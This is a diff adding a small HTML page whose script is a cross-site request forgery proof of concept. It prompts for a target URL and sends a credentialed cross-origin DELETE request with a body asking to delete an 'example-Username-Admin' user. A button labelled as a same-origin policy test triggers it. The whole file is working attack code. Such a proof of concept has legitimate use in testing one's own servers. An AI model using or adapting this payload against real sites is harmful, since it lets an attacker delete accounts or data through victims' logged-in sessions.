@@ -1,0 +1,22 @@
+<html>
+<body>
+
+<script>
+function csrf()
+{
+	console.log("Send started");
+	var url = prompt("Please input the Fully Qualified Domain Name to send a DELETE request to. I.E. https://testdomainnamehere.com");
+	var http = new XMLHttpRequest();
+	var data = '{"Example API Call Dependant on Same-Origin Policy and DELETE Requsts to prevent CSRF": {"Delete-User": "example-Username-Admin"}}';
+	console.log(http.open("DELETE", url, true));
+	http.withCredentials = true;
+	http.setRequestHeader("Content-Type", "text/plain");
+	http.send(data);
+	
+	return 0;
+}	
+</script>
+
+<button value="send DELETE" onclick="csrf()" text="Test Delete">Test Same Origin Policy</button>
+</body>
+</html>
